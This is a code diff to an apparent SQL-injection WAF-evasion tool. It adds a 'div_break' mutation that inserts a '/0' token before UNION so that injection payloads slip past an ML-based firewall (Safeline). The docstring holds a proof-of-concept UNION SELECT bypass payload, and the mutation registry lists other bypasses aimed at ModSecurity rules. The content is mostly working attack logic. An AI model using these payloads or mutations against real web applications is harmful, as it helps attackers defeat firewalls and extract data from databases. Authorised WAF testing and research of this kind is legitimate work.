@@ -544,6 +544,28 @@ class MutationEngine:
             return payload
         return ".1" + payload
 
+    @staticmethod
+    def div_break(payload: str) -> str:
+        """Insert a `/0` divide-by-zero context breaker after the injection
+        closing quote, before UNION. Keeps the UNION extraction intact while
+        presenting an unusual numeric-divide token that an ML-based WAF tends
+        to score as benign. Mirrors a manually-discovered Safeline bypass:
+
+            -1' UNION SELECT ...   ->   -1'/0 UNION SELECT ...
+            (PoC: .1--+-'/0 UNION ALL SELECT 1,CURRENT_DATE,3)
+
+        Semantic-preserving: does not change which columns are extracted.
+        """
+        if "/0" in payload:
+            return payload
+        m = re.search(r'(?i)union', payload)
+        if not m:
+            return payload
+        q = payload.rfind("'", 0, m.start())   # closing quote just before UNION
+        if q == -1:
+            return payload
+        return payload[:q + 1] + "/0" + payload[q + 1:]
+
     # =================================================================
     # SEMANTIC mutations — added for tiered ModSec rules (Opsi B)
     # These don't just rewrite syntax; they swap MySQL constructs that
@@ -795,6 +817,7 @@ MUTATIONS = {
     # --- Parser-divergence (manual-bypass discoveries vs ModSec) ---
     "null_byte":         MutationEngine.null_byte,
     "dot_prefix":        MutationEngine.dot_prefix,
+    "div_break":         MutationEngine.div_break,   # /0 ctx-breaker (Safeline PoC, semantic-preserving)
     # --- Semantic mutations (tiered ModSec — Opsi B) ---
     "func_swap_err":     MutationEngine.func_swap_error,
     "ident_backtick":    MutationEngine.identifier_backtick,
